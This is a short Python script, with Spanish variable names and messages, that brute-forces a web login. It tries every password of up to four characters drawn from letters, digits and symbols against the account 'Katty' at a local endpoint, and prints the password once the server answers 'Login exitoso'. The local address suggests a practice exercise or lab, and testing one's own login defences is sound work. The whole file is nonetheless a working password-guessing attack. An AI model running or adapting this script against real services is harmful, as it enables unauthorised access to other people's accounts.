import time
import requests
import sys

username = "Katty"  
url = "http://127.0.0.1:8000/login/"

minus = "abcdefghijklmnopqrstuvwxyz"
mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
numeros = "0123456789"
simbolos = "!@#$%^&*()_+-=[]|;:,.<>?"

alfabeto = minus + mayus + numeros + simbolos

def combinaciones(alfabeto, longitud):
    if longitud == 1:
        for caracter in alfabeto:
            yield caracter
    else:
        for caracter in alfabeto:
            for sub_combinacion in combinaciones(alfabeto, longitud - 1):
                yield caracter + sub_combinacion

longitud_maxima = 4
tiempo_inicio = time.time()
intentos = 0
contra_encontrada = False

def revision_simplificada(intento_actual):
    try:
        response = requests.post(
            url,
            json={'username': username, 'password': intento_actual}
        )
        if response.status_code == 200:  # número, no cadena
            data = response.json()
            if data.get("message") == "Login exitoso":  # confirmamos éxito
                return True
        return False
    except Exception as e:
        print(f"Error en la petición: {e}")
        return False


for longitud in range(1, longitud_maxima + 1):
    print(f"prueba de longitud {longitud}")
    
    for intento_actual in combinaciones(alfabeto, longitud):
        intentos += 1
        print(f"Probando: {intento_actual} (intento {intentos})") 
        
        if revision_simplificada(intento_actual):
            contra_encontrada = True
            print(f"¡Encontrada en intento {intentos}: {intento_actual}")
            break
    
    if contra_encontrada:
        break

tiempo_fin = time.time()
duracion = tiempo_fin - tiempo_inicio

if contra_encontrada:
    print(f"\nLa contraseña encontrada es: {intento_actual}")
    print(f"Intentos totales realizados: {intentos}")
    print(f"Tiempo de busqueda fue: {duracion:.2f} segundos")
    print(f"\n")
else:
    print(f"\nNo se encontró la contraseña")
    print(f"Se realizaron {intentos} intentos en total.")
    print(f"El tiempo de busqueda fue: {duracion:.2f} segundos")
print(f"\n")
